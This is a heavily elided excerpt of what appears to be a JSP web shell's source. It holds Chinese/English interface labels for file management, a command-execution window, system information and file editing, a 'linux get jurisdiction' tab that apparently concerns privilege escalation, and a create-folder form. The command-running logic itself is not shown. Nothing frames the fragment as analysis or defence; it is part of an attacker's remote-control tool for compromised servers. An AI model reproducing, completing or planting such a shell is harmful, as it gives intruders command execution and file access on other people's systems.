...
<%!private final static int languageNo = 0; //Language,0 : Chinese; 1:English
    ...
    String[] strFileManage = {"file manage", "File Management"};

    String[] strCommand = {"CMD exec", "Command Window"};

    String[] strSysProperty = {"system info", "System Property"};
    ...
    String[] strDrivers = {"dir", "Drivers"};

    String[] strFileName = {"file name", "File Name"};

    String[] strFileSize = {"size", "File Size"};

    String[] strLastModified = {"last modified", "Last Modified"};

    String[] strFileOperation = {"file manage", "Operations"};

    String[] strFileEdit = {"update", "Edit"};
    ...
    String[] strExecute = {"exec", "Execute"};
...
<ul id="tablist">
    ...
    <li>
        <a href="#" onClick="return expandcontent('menu4', this)"> linux get jurisdiction
        </a>
    </li>
</ul>
<!--Top Menu End-->
            ...
            <tr>
                <td colspan=2 bgcolor=#FBFFC6>
                    <form name="frmMake" action="" method="post"
                        ...
                        <input type="submit" name="btnNewDir" value="create folder">
                    </form>
